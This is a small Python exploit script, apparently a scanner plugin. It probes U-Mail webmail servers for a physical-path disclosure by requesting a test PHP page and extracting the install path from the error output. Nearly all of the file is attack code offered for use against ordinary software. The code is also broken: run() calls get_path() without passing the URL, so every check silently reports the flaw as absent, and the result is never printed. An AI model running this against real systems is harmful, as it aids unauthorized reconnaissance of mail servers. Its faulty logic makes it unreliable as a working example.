#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: umail物理路径泄露
referer: unknow
author: Lucifer
description: 泄露了物理路径。
'''
import re
import sys
import requests
import warnings
def get_path(url):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/webmail/client/mail/module/test.php"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            temp=re.search(r'a non-object in <b>(.*)\\client\\mail',req.text,re.S).group(1)
            temp=temp.split('\\')
            path=''
            for i in range(len(temp)):
                t=temp[i]+'/'
                path+=t
            return path
        except:
            return False

def run(url):
    result=['','不存在']
    try:
        path = get_path()
        if path != False:
            result[1]='存在'
            result[0] = "真实路径: "+path
        else:
            result[1]='不存在'
    except:
        result[1] = '不存在'
    return result
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    